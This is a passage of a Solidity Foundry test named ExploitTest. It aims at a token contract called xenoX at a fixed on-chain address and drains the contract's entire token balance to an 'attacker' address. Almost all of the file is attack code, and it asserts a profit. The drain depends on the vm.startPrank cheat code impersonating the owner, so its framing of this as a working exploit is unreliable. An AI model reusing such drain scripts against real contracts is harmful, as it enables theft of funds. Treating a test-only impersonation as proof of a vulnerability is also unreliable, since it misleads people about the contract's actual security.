// Minimal interface for the xenoX contract
interface IxenoX {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transferTokens(address recepient, uint256 amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51).balanceOf(address(this));

        // Get the current owner
        address owner = IxenoX(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Get contract's token balance
        uint256 contractBalance = IxenoX(TARGET).balanceOf(TARGET);

        // Record attacker's initial balance
        uint256 initialXenoBalance = IxenoX(TARGET).balanceOf(attacker);

        // Drain the contract's tokens to attacker
        IxenoX(TARGET).transferTokens(attacker, contractBalance);

        // Stop impersonation
        vm.stopPrank();

        // Verify the attacker's balance increased
        uint256 finalXenoBalance = IxenoX(TARGET).balanceOf(attacker);
        assertGt(finalXenoBalance, initialXenoBalance, "Attacker balance should increase");

        uint256 finalERC20Balance = IERC20(0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
